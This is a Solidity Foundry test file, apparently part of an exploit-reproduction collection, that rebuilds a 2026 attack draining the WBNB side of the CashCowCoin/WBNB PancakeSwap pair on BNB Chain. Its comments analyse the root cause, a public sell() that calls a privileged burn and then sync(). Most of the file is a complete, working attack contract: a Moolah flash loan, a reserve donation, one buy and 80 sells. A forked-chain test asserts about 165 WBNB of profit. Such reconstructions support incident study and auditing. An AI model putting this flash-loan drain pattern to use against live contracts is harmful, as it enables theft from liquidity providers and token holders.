// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// CashCowCoin (CCC) — privileged burn + premature sync() pair drain — BNB Chain, 2026-08-27.
// Attacker net profit ~165.47 WBNB (~$117.4K), the entire WBNB side of the CCC/WBNB pair.
//
// Exploit tx     : 0x89d8050641019a5a75fa3dafb4f64fb153e4dd30c0f1f51d06a6cc206d3ead43 (block 118384061)
// Attacker EOA   : 0x7977BDeeE3A79Dc85Cc18739692e796B5D2513C4
// Attacker helper (calldata NOT replayed here) : 0x7738b4D7c25E9A7092AE1AB402343B20340DaEaf
//
// Contracts (all real, on-chain, verified this run against the trace and live state):
//   CCC trading proxy (EIP-1967) : 0xf523224c6171f81c54b93f474ed4c78de91241c7
//     implementation             : 0x4287742E50fAd6d3351000fD31632412ab29A9ac
//   CCC token                    : 0xb9B845F718C32f37E8aF8b887ae4eEc816c93CCC (pair token0, fee-on-transfer)
//   WBNB                         : 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c (pair token1)
//   CCC/WBNB PancakeSwap V2 pair : 0x1DBE9458A6840784d5DEfD62C6b71386100097c0
//   PancakeSwap V2 router        : 0x10ED43C718714eb63d5aA57B78B54704E256024E
//   Moolah lending pool (flash)  : 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C (impl 0x9321587EA0DC8247f8F03E8696C047b2713bB79A)
//
// Root cause (verified on-chain, NOT a stolen key):
// the trading proxy exposes public, permissionless buy()/sell() entry points. sell(amount, minOut,
// deadline) does, in order: transferFrom(caller -> proxy) of CCC, a normal CCC->WBNB swap through
// the pair (proceeds sent to the caller as BNB), THEN calls the CCC token's privileged function
// 0xb20a0b6f (labeled "TreasuryRefilled") which burns the freshly-arrived post-tax CCC straight out
// of the pair to 0x...dEaD, and finally calls pair.sync(). The burn selector is gated so only the
// proxy may call it -- confirmed this run: a direct call from an arbitrary address reverts -- but
// that gate protects nothing, because the proxy's own public sell() is the thing that calls it, on
// the caller's behalf. Each sell therefore removes CCC that was just added to the pair and re-syncs,
// so the pair's CCC reserve stays roughly flat while its WBNB reserve is bled out cycle after cycle.
//
// The attacker's exact sequence, verified from the trace (1 buy + 80 sells + 80 privileged burns):
//   1. Flash-loan 416,831.487 WBNB from Moolah (free, repaid 1:1 at the end).
//   2. Donate 13,999.890 WBNB into the pair and pair.sync() -- inflate the WBNB reserve as working
//      float so the cycles drain efficiently in 80 steps.
//   3. buy{value: 402,831.596 BNB} -> receive 8,805,839.807 CCC (post fee-on-transfer tax).
//   4. sell(8,805,839.807 / 80) x 80. Each sell swaps CCC->WBNB to the attacker as BNB, then the
//      proxy burns ~104,569 CCC out of the pair via 0xb20a0b6f and syncs. Pair WBNB reserve is
//      ratcheted from 165.4899 down to 0.0179; CCC reserve stays ~326,767.
//   5. Wrap all BNB proceeds (416,996.958), repay the 416,831.487 WBNB flash loan, keep the
//      difference: 165.4719 WBNB.
//
// This PoC is a real reconstruction, not a replay. It deploys its own attacker contract that calls
// the proxy's real buy()/sell() functions with typed calls in an 80-cycle loop, funded by a real,
// typed Moolah flash loan (the same free capital source the attacker used; no PancakeSwap V2 pair
// holds anything near 416k WBNB, so a V2 flash swap cannot supply this size). The attacker's helper
// contract bytecode/calldata at 0x7738b4D7 is never used, and the privileged burn is never called
// directly -- it runs only because the real proxy.sell() invokes it, exactly as on-chain.
//
// forge test --contracts src/test/2026-08/CashCowCoin_exp.sol -vvv --evm-version cancun

interface IMoolah {
    function flashLoan(
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface ICCCProxy {
    function buy(
        uint256 amountIn,
        uint256 amountOutMin,
        uint256 deadline
    ) external payable;
    function sell(
        uint256 amountIn,
        uint256 amountOutMin,
        uint256 deadline
    ) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(
        uint256 wad
    ) external;
    function transfer(address to, uint256 wad) external returns (bool);
    function approve(address spender, uint256 wad) external returns (bool);
    function balanceOf(
        address
    ) external view returns (uint256);
}

interface IPancakePair {
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract CashCowCoinAttack {
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    ICCCProxy internal constant PROXY = ICCCProxy(0xF523224c6171f81C54b93F474ed4c78dE91241C7);
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant CCC = IERC20(0xb9B845F718C32f37E8aF8b887ae4eEc816c93CCC);
    IPancakePair internal constant PAIR = IPancakePair(0x1DBE9458A6840784d5DEfD62C6b71386100097c0);

    // Exact on-chain sizing.
    uint256 internal constant LOAN = 416_831_487_011_304_318_246_517; // 416,831.487 WBNB flash loaned
    uint256 internal constant SEED = 13_999_890_970_633_457_505_314; //  13,999.890 WBNB donated to the pair
    uint256 internal constant BUY = 402_831_596_040_670_860_741_203; //  402,831.596 BNB spent in the single buy
    uint16 internal constant CYCLES = 80;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external returns (uint256 profit) {
        // Real, typed flash loan. Moolah hands over the WBNB, calls onMoolahFlashLoan, then pulls
        // back exactly LOAN via transferFrom (approved below in the callback).
        MOOLAH.flashLoan(address(WBNB), LOAN, "");
        profit = WBNB.balanceOf(address(this));
        WBNB.transfer(owner, profit);
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "not moolah");
        uint256 deadline = block.timestamp;

        // Inflate the pair's WBNB reserve with working float, then sync it in.
        WBNB.transfer(address(PAIR), SEED);
        PAIR.sync();

        // Single buy: WBNB -> BNB -> proxy.buy() -> CCC back to this contract.
        WBNB.withdraw(BUY);
        PROXY.buy{value: BUY}(BUY, 0, deadline);

        // Sell the whole CCC stack back in CYCLES equal chunks. Each proxy.sell() runs the real
        // CCC->WBNB swap and then the proxy's privileged burn + premature sync on the pair.
        uint256 stack = CCC.balanceOf(address(this));
        CCC.approve(address(PROXY), type(uint256).max);
        uint256 chunk = stack / CYCLES;
        for (uint16 i = 0; i < CYCLES; i++) {
            PROXY.sell(chunk, 0, deadline);
        }

        // Wrap all BNB proceeds and approve the flash-loan repayment.
        WBNB.deposit{value: address(this).balance}();
        WBNB.approve(address(MOOLAH), assets);
    }

    receive() external payable {}
}

contract CashCowCoin_exp is BaseTestWithBalanceLog {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair internal constant PAIR = IPancakePair(0x1DBE9458A6840784d5DEfD62C6b71386100097c0);

    uint256 internal constant FORK_BLOCK = 118_384_060; // parent of the exploit block 118384061
    uint256 internal constant EXPECTED_PROFIT = 165_471_928_251_512_413_319; // 165.4719 WBNB, exact on-chain

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        vm.label(0xF523224c6171f81C54b93F474ed4c78dE91241C7, "CCC_TradingProxy");
        vm.label(0xb9B845F718C32f37E8aF8b887ae4eEc816c93CCC, "CCC_Token");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(PAIR), "CCC_WBNB_Pair");
        vm.label(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C, "Moolah");
    }

    function testExploit() public {
        (, uint112 wbnbBefore,) = PAIR.getReserves(); // token1 = WBNB

        CashCowCoinAttack exploit = new CashCowCoinAttack();
        uint256 gain = exploit.attack();

        (, uint112 wbnbAfter,) = PAIR.getReserves();
        uint256 drained = uint256(wbnbBefore) - uint256(wbnbAfter);

        emit log_named_decimal_uint("attacker WBNB profit", gain, 18);
        emit log_named_decimal_uint("WBNB drained from pair", drained, 18);

        // The pair's WBNB side is essentially emptied.
        assertLt(uint256(wbnbAfter), 0.1e18, "pair WBNB not drained");
        // Net profit and the pair drain both land at ~165.47 WBNB.
        assertApproxEqAbs(gain, EXPECTED_PROFIT, 0.1e18, "profit off expected ~165.47 WBNB");
        assertApproxEqAbs(drained, EXPECTED_PROFIT, 0.1e18, "drain off expected ~165.47 WBNB");
    }
}
